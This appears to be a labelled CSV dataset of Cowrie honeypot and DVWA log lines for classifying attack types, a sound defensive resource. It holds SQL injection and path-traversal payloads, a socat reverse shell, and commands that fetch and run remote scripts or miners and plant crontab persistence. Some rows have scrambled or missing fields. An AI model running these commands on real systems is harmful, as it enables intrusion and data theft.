text,label
source:cowrie event:cowrie.command.input ip:91.251.200.219 username:- password:- command:w request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:185.222.127.192 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+1,2,3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:45.33.109.217 username:- password:- command:netstat -tulnp request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:10.69.151.30 username:- password:- command:wget http://malware.com/bot.sh request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:10.210.159.119 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:103.36.32.216 username:- password:- command:cat /etc/hosts request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input username:- password:- command:cp /bin/bash /tmp/.hidden_bash && chmod +s /tmp/.hidden_bash request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input username:- password:- command:systemctl enable backdoor request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:91.96.1.24 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id='+OR+1=1--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:185.170.67.116 username:nobody password:123abc command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:185.120.222.117 username:sync command:- password:monkey request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:91.89.253.151 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1=2+UNION+SELECT+table_name,null+FROM+information_schema.tables--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+null%2cnull+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.63.205 username:- password:- command:curl -s http://192.168.1.100/payload | bash request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:qwerty123 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- /var/log/lastlog command:cat request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:45.228.116.229 username:- password:- command:- request:""POST HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+INTO+OUTFILE+'/var/www/html/shell.php'--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:103.146.14.186 username:list password:guest command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.failed ip:10.254.152.189 username:consul password:letmein1 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.failed ip:192.168.165.197 username:mysql password:welcome1 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:RECON ip:45.31.34.243 username:- password:- command:- request:""GET /dvwa/phpinfo.php HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input ip:192.168.61.74 username:- password:- command:wget http://45.33.32.156/miner request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:203.36.210.121 username:- password:- command:nmap -sV 192.168.1.0/24 request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:103.65.203.143 username:daemon password:admin@123 command:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:172.21.191.213 password:- command:ls -la /opt request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:203.137.185.81 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:103.193.144.134 username:ansible password:hello123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:172.21.22.163 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1;SELECT+*+FROM+users--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.121.229 username:- password:- command:crontab -l request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:203.171.122.178 username:mysql password:hello command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:203.203.234.11 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+1,2,3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:203.88.68.73 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ifconfig request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1%3d2+UNION+SELECT+username%2cpassword+FROM+users+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:curl http://evil.com/payload.sh request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+null%2cnull+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie ip:10.53.136.202 event:cowrie.login.success username:elastic password:abc123 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.7.154 username:elastic password:vagrant command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.failed ip:172.24.89.60 username:sync password:guest command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:LOGIN ip:103.66.152.145 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:185.90.39.24 username:- password:- command:iptables -P ACCEPT request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.100.252 username:- password:- command:ls -la /opt request:-,SSH_COMMAND-COWRIE
event:cowrie.login.success source:cowrie ip:203.177.53.106 username:postgres password:000000 command:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:45.160.135.254 username:- password:- command:dd of=/tmp/fill bs=1M count=500 request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1%3b+DROP+TABLE+users+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:185.22.110.26 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+@@datadir,@@basedir--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:91.140.15.13 username:jenkins password:123abc command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:RECON ip:103.91.210.223 username:- password:- command:- request:""GET HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input ip:103.25.191.190 username:- password:- command:cat /etc/passwd request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:10.34.55.188 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:103.241.145.173 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:91.55.113.181 username:- password:- command:ss -tulnp request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:185.232.174.139 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:45.254.113.65 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1'+AND+SLEEP(5)--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:RECON ip:45.193.184.48 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fself%2fcmdline HTTP/1.1""",CMD_INJECTION-DVWA
"source:DVWA event:SQLi ip:45.83.160.92 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+sleep(5)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:RECON ip:103.61.60.145 username:- password:- command:- request:""GET /dvwa/.htaccess HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:172.31.17.225 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1;SELECT+*+FROM+users--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:185.79.198.253 username:- password:- command:netstat -tulnp request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:cat /proc/version request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:10.173.128.208 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1=2+UNION+SELECT+table_name,null+FROM+information_schema.tables--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success username:pi password:password request:- command:-,SSH_SUCCESS-COWRIE
"source:DVWA event:RECON ip:103.89.90.16 username:- password:- command:- request:""GET /dvwa/setup.php HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 password:- username:- command:last request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:192.168.94.236 username:admin password:monkey command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie ip:91.114.137.205 username:- password:- command:./xmrig --donate-level 1 -o xmr.pool.minergate.com:45700 request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:172.24.15.165 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+1,2,3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:45.100.44.66 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+(SELECT+COUNT(*)+FROM+users)>0--&Submit=Submit HTTP/1.1""",SQLI-DVWA
event:cowrie.login.success source:cowrie ip:10.155.248.206 username:ftp password:letmein command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.244.137 password:pass username:root request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:RECON ip:91.38.91.154 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fshadow HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.login.success ip:185.220.81.26 username:mysql password:admin123 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:185.23.41.84 password:- command:cat /etc/passwd request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:who request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:203.124.63.5 username:- request:""GET password:- /dvwa/vulnerabilities/sqli/?id=1'+AND+SLEEP(5)--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:cowrie event:cowrie.command.input ip:192.168.217.249 username:- password:- command:socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444 request:-",SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:91.8.54.15 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:91.81.218.49 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id='+OR+1=1--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:cat /etc/hosts request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:45.51.198.95 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fself%2fenviron HTTP/1.1""",RECON-DVWA
"source:DVWA event:RECON ip:203.82.66.233 username:- password:- command:- request:""GET /dvwa/vulnerabilities/csrf/ HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+a%3da&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:10.19.37.80 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.client.kex ip:19.246.79.107 username:- password:- command:- request:-source:cowrie event:recon ip:19.246.79.107 username:root password:- command:- request:-,RECON-COWRIE
"source:DVWA ip:10.243.114.18 username:- password:- command:- /dvwa/login.php request:""POST HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.132.151 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+schema_name,null+FROM+information_schema.schemata--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.client.version ip:92.115.94.162 username:- password:- command:- request:SSH-2.0-OpenSSH,RECON-COWRIE
"event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET HTTP/1.1"" /dvwa/vulnerabilities/sqli/?id=1+OR+2%3e1&Submit=Submit",SQLI-DVWA
"source:DVWA ip:185.20.59.125 username:- password:- command:- request:""GET HTTP/1.1"" /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+column_name,null+FROM+information_schema.columns+WHERE+table_name='users'--&Submit=Submit",SQLI-DVWA
"source:DVWA event:LOGIN ip:10.112.150.93 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.14.237 username:- password:- command:id request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:185.21.25.22 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fhome%2fphil%2f.bash_history HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:91.81.156.216 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id='+OR+1=1--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
event:cowrie.command.input ip:91.181.80.225 username:- password:- command:history request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:hello command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:103.51.3.246 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:203.125.60.80 username:list password:monkey command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:LOGIN ip:185.213.216.180 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:91.234.85.11 username:- password:- command:- request:""POST /dvwa/login.php",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:103.198.63.192 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:103.195.219.78 username:- password:- command:echo '#!/bin/sh' > back.sh request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:185.128.130.45 username:oracle password:12345 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ls request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.239.61 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:cd .. request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:91.114.212.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:91.62.124.252 username:- password:- command:find / -perm -4000 2>/dev/null request:-,SSH_COMMAND-COWRIE
source:cowrie ip:103.208.227.122 event:cowrie.login.success username:test password:michael command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:91.243.220.170 username:- password:- command:echo '* * * * * root /tmp/bot.sh' >> /etc/crontab request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:45.41.18.90 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+1,2,3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:91.116.31.218 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+sleep(5)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:192.168.8.244 username:sync password:sunshine command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:RECON ip:91.76.36.55 username:- command:- password:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fshadow HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.login.success ip:192.168.176.81 username:proxy password:solo command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:10.68.99.64 username:sshd password:000000 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+1%3d1%23&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.failed ip:185.34.66.25 username:nomad password:sunshine command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.failed ip:192.168.45.175 username:admin password:test command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.success ip:203.50.34.45 username:jenkins password:pass@123 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:45.244.199.78 username:- password:- command:yum install -y nc request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.client.kex ip:210.160.9.173 username:- password:- command:- request:-source:cowrie event:recon ip:210.160.9.173 username:root password:- command:- request:-,RECON-COWRIE
source:cowrie ip:103.203.177.250 username:grafana password:123abc command:- request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:10.156.139.95 username:nomad password:superman command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input username:- password:- command:cd /tmp request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:185.38.62.202 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:185.60.39.161 username:- password:- request:""GET command:- /dvwa/vulnerabilities/sqli/?id=1'+AND+SLEEP(5)--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.237.76 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.81.184 username:- password:- command:wget http://45.33.32.156/miner request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:203.179.236.107 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:185.194.193.56 username:tomcat password:passw0rd command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.failed ip:10.91.15.57 username:test password:pass@123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:172.22.251.174 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1;EXEC+xp_cmdshell('whoami')--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.failed ip:10.9.193.27 username:daemon password:letmein1 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"event:LOGIN ip:192.168.77.1 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN username:- password:- command:- /dvwa/login.php request:""POST HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:103.12.109.14 username:- password:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fvar%2fwww%2fhtml%2fdvwa%2fconfig%2fconfig.inc.php HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:203.198.58.87 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+column_name,null+FROM+information_schema.columns+WHERE+table_name='users'--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:185.111.81.5 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.94.48 username:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:203.176.167.114 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+null%2cnull+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:172.26.42.173 username:- password:- command:hostname request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:91.188.19.8 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:id request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:185.75.97.2 username:grafana password:password123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
event:cowrie.command.input source:cowrie ip:172.26.110.210 username:- password:- command:last request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:185.168.238.160 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:45.254.75.214 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fvar%2fwww%2fhtml%2fdvwa%2fconfig%2fconfig.inc.php HTTP/1.1""",RECON-DVWA
event:cowrie.login.failed source:cowrie ip:172.27.64.171 username:jenkins password:123abc command:- request:-,BRUTE_FORCE_SSH-COWRIE
"event:SQLi ip:192.168.244.137 username:- command:- password:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+null%2cnull+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:203.241.3.235 username:user password:password123 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:203.178.159.40 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:172.21.237.54 username:- password:- request:""GET command:- /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+@@datadir,@@basedir--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA ip:103.167.104.97 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fvar%2flog%2fauth.log HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:192.168.62.54 password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+@@datadir,@@basedir--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi username:- ip:172.24.244.85 password:- command:- /dvwa/vulnerabilities/sqli/?id=0+UNION+ALL+SELECT+NULL,NULL,NULL--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:91.205.194.230 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1;EXEC+xp_cmdshell('whoami')--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:10.17.55.56 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST HTTP/1.1"" /dvwa/login.php",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fhome%2fphil%2f.bash_history HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ls -la /tmp request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:203.26.204.107 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fhome%2fphil%2f.bash_history HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+a%3da&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:10.125.2.13 username:- password:- command:history request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:45.130.155.7 username:pi password:P@ssw0rd command:- request:-,SSH_SUCCESS-COWRIE
"event:SQLi ip:192.168.232.39 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+load_file('/etc/passwd'),null--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:203.13.22.72 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id='+OR+1=1--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.171.63 username:- password:- command:cat ~/.ssh/authorized_keys request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:iloveyou command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
